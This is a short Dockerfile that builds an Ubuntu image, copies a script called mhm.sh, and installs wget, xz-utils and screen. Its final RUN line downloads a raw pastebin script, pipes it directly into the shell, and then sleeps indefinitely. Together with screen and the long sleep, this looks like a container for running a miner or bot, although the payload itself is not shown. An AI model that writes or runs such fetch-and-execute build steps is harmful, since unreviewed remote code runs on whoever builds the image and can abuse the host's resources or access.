FROM ubuntu:latest

WORKDIR /app

COPY mhm.sh /app/mhm.sh

RUN chmod +x /app/mhm.sh

COPY . /app

RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
RUN (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && sleep 999999
